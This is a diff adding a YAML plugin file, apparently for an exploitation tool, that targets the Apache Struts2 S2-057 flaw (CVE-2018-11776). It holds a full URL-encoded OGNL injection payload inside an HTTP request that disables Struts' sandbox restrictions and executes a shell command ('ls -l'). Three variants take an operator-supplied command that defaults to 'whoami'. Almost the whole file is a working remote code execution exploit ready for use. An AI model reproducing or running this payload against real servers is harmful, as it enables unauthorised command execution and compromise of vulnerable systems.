@@ -1,0 +1,48 @@
+info:
+    app: Struts2
+    name: S2_057
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: 2018-08-01
+    create_date: "2024-10-06 12:56:32"
+    update_date: "2024-10-06 12:56:32"
+    scope: Apache Struts 2.3 – Struts 2.3.34、Apache Struts 2.5 – Struts 2.5.16
+    description: 当struts.mapper.alwaysSelectFullNamespace设置为true，并且package标签页以及result的param标签页的namespace值的缺失，或使用了通配符时可造成namespace被控制，最终namespace会被带入OGNL语句执行，从而产生远程代码执行漏洞。
+    vul_id: CVE-2018-11776
+    detail: |
+        利用点在URI
+        目前只支持cmd
+        struts.xml，设置struts.mapper.alwaysSelectFullNamespace  = true
+        URL如http://192.168.111.111:8080/struts2-showcase/actionChain1.action
+        载荷有三种对应版本不一样，1为2.3.34，2为2.3.20，3为2.5.16
+    payload: |
+        GET /struts2-showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%20-l%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action HTTP/1.1
+        Host: 192.168.111.111:8080
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+payloads:
+    - name: cmd1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: cmd2
+      alias: 命令执行2
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: cmd3
+      alias: 命令执行3
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
